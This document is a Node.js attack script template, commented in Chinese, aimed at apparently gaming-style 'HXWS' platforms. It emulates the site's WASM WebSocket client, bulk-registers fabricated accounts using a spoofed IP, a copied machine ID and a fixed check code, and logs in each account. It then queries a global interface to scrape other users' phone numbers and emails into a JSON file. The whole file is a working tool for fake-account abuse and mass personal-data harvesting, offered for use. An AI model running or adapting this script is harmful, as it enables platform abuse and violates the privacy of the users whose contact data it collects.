// 批量注册 + 全局接口提取脚本模板 (HXWS 类平台)
// 用法: node bulk_extract.js <count> <start> <outPrefix>
// 前置: hxws.wasm/hxws.js 已下载到同目录, ws 模块已安装
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const RealWS = require('ws');

// ===== 浏览器环境模拟 (加载 wasm C 库必需) =====
global.window = global;
global.self = global;
global.document = {
  getElementById: () => null, querySelector: () => null,
  createElement: () => ({ style: {}, getContext: () => null }),
  documentElement: { style: {} }, body: { appendChild: () => {}, style: {} },
  addEventListener: () => {},
  location: { href: 'https://target.com/', hostname: 'target.com', protocol: 'https:' }
};
global.location = global.document.location;
global.navigator = { userAgent: 'Mozilla/5.0', platform: 'Win32', language: 'en' };
global.WebSocket = RealWS;
global.performance = require('perf_hooks').performance;
global.require = require;

const wasmBuf = fs.readFileSync(path.join(__dirname, 'hxws.wasm'));
const glueCode = fs.readFileSync(path.join(__dirname, 'hxws.js'), 'utf8');
const patched = glueCode.replace(
  "var wasmBinaryFile;",
  "var wasmBinaryFile = 'hxws.wasm';\n  var wasmBinary = new Uint8Array(" + JSON.stringify([...wasmBuf]) + ");"
);
const Module = {};
global.Module = Module;
const fn = new Function('Module', 'require', patched);
fn(Module, require);

function md5hex(s) { return crypto.createHash('md5').update(s).digest('hex'); }
const MACHINE = '<机器码>';           // 从目标 JS 提取
const WS_URL = 'wss://<ws域名>/net';  // 目标 WS 地址
const IP = '<公网IP>';                // startWebsocket 第二参数

const COUNT = parseInt(process.argv[2] || '50', 10);
const START = parseInt(process.argv[3] || '0', 10);

// ===== 账号生成 (时间戳+序号防重复) =====
function genAccounts(n, start) {
  const list = [];
  const seed = Date.now().toString().slice(-4);
  for (let i = 0; i < n; i++) {
    const acc = '9' + seed + String(10000000 + start + i);
    list.push({ acc, pwd: 'Aa1' + seed + i + '!', nick: 'x' + seed + (start + i) });
  }
  return list;
}
const ACCOUNTS = genAccounts(COUNT, START);

// ===== Writer (复刻前端字段写入) =====
class Writer {
  constructor(mcmd, scmd) {
    this.ws = Module.WebsocketClient.instance();
    this.r = this.ws.getSendBufferSize();
    this.s = this.ws.allocSendBuffer(mcmd, scmd, 0);
    if (this.s <= 0) throw new Error('alloc');
    this.dv = new DataView(Module.HEAPU8.buffer, this.s, this.r);
    this.off = 0;
  }
  get length() { return this.off; }
  w8(v) { this.dv.setUint8(this.off++, v); }
  w16(v) { this.dv.setUint16(this.off, v, true); this.off += 2; }
  w32(v) { this.dv.setUint32(this.off, v >>> 0, true); this.off += 4; }
  w64(v) { this.dv.setBigInt64(this.off, BigInt(v), true); this.off += 8; }
  padding(v, a) {
    if (a <= 0) return;
    const r = 8;
    for (let s = Math.floor(a / r); s > 0; s--) this.w64(v);
    switch (a % r) {
      case 7: this.w32(v); this.w16(v); this.w8(v); break;
      case 6: this.w32(v); this.w16(v); break;
      case 5: this.w32(v); this.w8(v); break;
      case 4: this.w32(v); break;
      case 3: this.w16(v); this.w8(v); break;
      case 2: this.w16(v); break;
      case 1: this.w8(v); break;
    }
  }
  wUTF16(str, max) {
    const t = str || '';
    if (max == 0) { for (let r = 0; r < t.length; r++) this.w16(t.charCodeAt(r)); }
    else {
      for (let r = 0, s = Math.min(t.length, max - 1); r < s; r++) this.w16(t.charCodeAt(r));
      this.padding(0, (max - 1 - t.length) * 2);
    }
    this.w16(0);
  }
  wUTF8(str, max) {
    const t = new TextEncoder().encode(str || '');
    if (max == 0) { for (let s = 0; s < t.length; s++) this.w8(t[s]); }
    else {
      for (let s = 0, n = Math.min(t.length, max - 1); s < n; s++) this.w8(t[s]);
      this.padding(0, max - 1 - t.length);
    }
    this.w8(0);
  }
}

// ===== 模板: 从目标 main.js 提取对应字段 =====
const REGISTER_TEMPLATE = [
  { t: 'uint16_t', k: 'moduleID' }, { t: 'uint32_t', k: 'plazaVersion' },
  { t: 'uint8_t', k: 'deviceType' }, { t: 'char16_t', k: 'machineID', s: 33 },
  { t: 'char16_t', k: 'accounts', s: 32 }, { t: 'char16_t', k: 'logonPass', s: 33 },
  { t: 'char16_t', k: 'checkCode', s: 33 }, { t: 'char16_t', k: 'nickName', s: 32 },
  { t: 'uint16_t', k: 'faceID' }, { t: 'uint8_t', k: 'gender' },
  { t: 'uint8_t', k: 'ipAddr', s: 14 }, { t: 'utf8', k: 'channelName', s: 0 },
  { t: 'uint32_t', k: 'spreadBindID' }, { t: 'uint32_t', k: 'adID' },
];
const RELOGON_TEMPLATE = [
  { t: 'uint32_t', k: 'gameID' }, { t: 'char16_t', k: 'dynamicPass', s: 33 },
  { t: 'char16_t', k: 'ip', s: 16 }, { t: 'char16_t', k: 'machineID', s: 33 },
  { t: 'uint8_t', k: 'platformID' },
];

function writeData(writer, data, template) {
  for (const f of template) {
    const { t, k, s } = f;
    switch (t) {
      case 'uint8_t': {
        if (Array.isArray(data[k])) {
          for (let i = 0; i < s; i++) writer.w8(i < data[k].length ? data[k][i] : 0);
        } else writer.w8(data[k] || 0);
        break;
      }
      case 'uint16_t': writer.w16(data[k] || 0); break;
      case 'uint32_t': writer.w32(data[k] || 0); break;
      case 'uint64_t': writer.w64(data[k] || 0); break;
      case 'char16_t': writer.wUTF16(data[k], s || 0); break;
      case 'utf8': writer.wUTF8(data[k], s || 0); break;
      default: throw new Error('unknown ' + t);
    }
  }
}

let idx = 0;
let session = null;
let phase = 0;
const seen = new Set();

function sendRegister() {
  const a = ACCOUNTS[idx];
  const w = new Writer(1, 3); // MDM_MB_LOGON=1, SUB_REGISTER=3
  writeData(w, {
    moduleID: 1, plazaVersion: 101122049, deviceType: 3, machineID: MACHINE,
    accounts: a.acc, logonPass: md5hex(a.pwd), checkCode: '123456',
    nickName: a.nick, faceID: 1, gender: 1, ipAddr: [77, 107, 99, 203],
    channelName: 'ORGANIC-10001', spreadBindID: 1, adID: 0
  }, REGISTER_TEMPLATE);
  w.ws.sendNetData(w.length);
}

function sendRelogon() {
  const w = new Writer(1, 10);
  writeData(w, {
    gameID: session.gameID, dynamicPass: session.dynamicPass,
    ip: '77.107.99.203', machineID: MACHINE, platformID: 3
  }, RELOGON_TEMPLATE);
  w.ws.sendNetData(w.length);
}

function sendGlobalQuery() {
  // 全局接口 (如 GetMobiles=1278, CMD_MB_Common_Query 无参数)
  const w = new Writer(3, 1278);
  w.ws.sendNetData(w.length);
}

function decodeLogon(buf) {
  // 完整 LOGON_SUCCESS 解析 (faceID/gender/customID 偏移不能省!)
  let o = 0;
  const r16 = () => { const v = buf.readUInt16LE(o); o += 2; return v; };
  const r8 = () => buf.readUInt8(o++);
  const r32 = () => { const v = buf.readUInt32LE(o); o += 4; return v; };
  const r64 = () => { const v = buf.readBigInt64LE(o); o += 8; return v; };
  const rStr16 = (max) => {
    let s = '';
    for (let i = 0; i < max; i++) {
      const c = buf.readUInt16LE(o + i * 2);
      if (c === 0) break;
      s += String.fromCharCode(c);
    }
    o += max * 2;
    return s;
  };
  return { faceID: r16(), gender: r8(), customID: r32(), userID: r32(), gameID: r32(), experience: r32(), loveLiness: r64().toString(), accounts: rStr16(32), nickName: rStr16(32), dynamicPass: rStr16(33), userScore: r64().toString() };
}

function parseRelogon(buf) { return { errorCode: buf.readUInt32LE(0) }; }

function statusCb(status) {
  if (status === 3 && phase === 0) { phase = 1; setTimeout(sendRegister, 200); }
}

function msgCb(mcmd, scmd, ptr, len, flag) {
  if (scmd === 100 && phase === 1) {
    session = decodeLogon(Buffer.from(new Uint8Array(Module.HEAPU8.buffer, ptr, len)));
    phase = 2; setTimeout(sendRelogon, 200);
  } else if (scmd === 12 && phase === 1) {
    phase = 2; setTimeout(sendRelogon, 200); // 已存在 → 试登录(需 LOGON 逻辑)
  } else if (scmd === 10 && phase === 2) {
    const r = parseRelogon(Buffer.from(new Uint8Array(Module.HEAPU8.buffer, ptr, len)));
    if (r.errorCode === 0) { phase = 3; setTimeout(sendGlobalQuery, 200); }
    else { phase = 1; setTimeout(sendRegister, 300); }
  } else if (phase === 3) {
    // 全局接口响应: 提取数据 (手机号/邮箱等)
    const buf = Buffer.from(new Uint8Array(Module.HEAPU8.buffer, ptr, len));
    let s = '';
    for (let i = 0; i < buf.length; i++) {
      const c = buf.readUInt8(i);
      if (c >= 32 && c < 127) s += String.fromCharCode(c);
    }
    const phones = s.match(/0{0,2}5\d{8,12}|00\d{10,14}|[0-9]{10,13}/g) || [];
    phones.forEach(p => seen.add(p));
    console.log(`[${idx+1}/${COUNT}] ${ACCOUNTS[idx].acc}: ${phones.length} 条 | 累计唯一: ${seen.size}`);
    idx++;
    if (idx < ACCOUNTS.length) { phase = 1; setTimeout(sendRegister, 200); }
    else finish();
  }
  return true;
}

function finish() {
  const outPrefix = process.argv[4] || 'bulk';
  const all = [...seen];
  fs.writeFileSync(path.join(__dirname, `m9600_mobiles_${outPrefix}_${START}.json`), JSON.stringify(all, null, 2));
  console.log(`完成: ${idx} 账号, ${seen.size} 唯一`);
  process.exit(0);
}

setTimeout(() => {
  const ret = Module.WebsocketClient.instance().startWebsocket(WS_URL, IP, statusCb, msgCb);
  console.log('startWebsocket:', ret);
  setTimeout(() => { console.log('=== 超时 ==='); finish(); }, 300000);
}, 1500);
